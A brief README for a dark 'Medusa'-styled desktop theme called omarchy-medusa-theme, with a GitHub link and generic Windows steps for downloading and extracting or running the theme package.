# 🐍 omarchy-medusa-theme - A calm theme with bold style

## 🎯 What this is

omarchy-medusa-theme is a desktop theme package with a dark, striking look shaped around the Medusa idea. It gives your Windows setup a strong visual style with clean contrast, sharp colors, and a unique feel.

Use it if you want your system to look different without spending time on custom design work.

## 📥 Download and install

Visit this page to download:
https://github.com/kirolos5/omarchy-medusa-theme

Follow these steps on Windows:

1. Open the link in your browser.
2. Find the latest release or download files on the page.
3. Download the theme package to your computer.
4. Open the downloaded file or extract the archive if it is compressed.
5. Follow the files included in the package to apply the theme.

If you see a `.zip` file, right-click it and choose Extract All.  
If you see an installer, double-click it to start setup.

## 🖥️ What you need

This theme is built for a Windows desktop setup. For the smoothest install, use:

- Windows 10 or Windows 11

For the best result, keep your Windows theme settings easy to find. That makes it simpler to apply the new look and switch back if you want.
